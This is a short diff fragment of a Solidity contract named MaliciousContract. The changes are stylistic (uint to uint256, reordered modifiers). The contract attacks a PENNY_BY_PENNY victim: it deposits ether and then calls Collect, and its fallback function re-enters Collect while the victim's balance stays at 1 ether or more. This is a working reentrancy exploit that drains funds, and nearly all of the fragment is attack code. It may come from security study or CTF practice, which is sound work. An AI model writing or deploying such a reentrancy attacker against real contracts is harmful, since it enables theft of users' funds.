@@ -9,17 +9,17 @@ contract MaliciousContract {
         penny_by_penny = PENNY_BY_PENNY(_victimAddress);
     }
 
-    function attack(uint amount) public {
+    function attack(uint256 amount) public {
         require(amount >= 1 ether, "Must send at least 1 ether");
         penny_by_penny.Collect(amount);
     }
 
-    function deposit(uint timeLock) public payable {
+    function deposit(uint256 timeLock) public payable {
         require(msg.value >= 1 ether, "Must add at least 1 ether");
         penny_by_penny.Put.value(msg.value)(timeLock);
     }
 
-    function() payable public {
+    function() public payable {
         // Re-enter the vulnerable function if there's still balance to collect
         if (address(penny_by_penny).balance >= 1 ether) {
             penny_by_penny.Collect(1 ether);
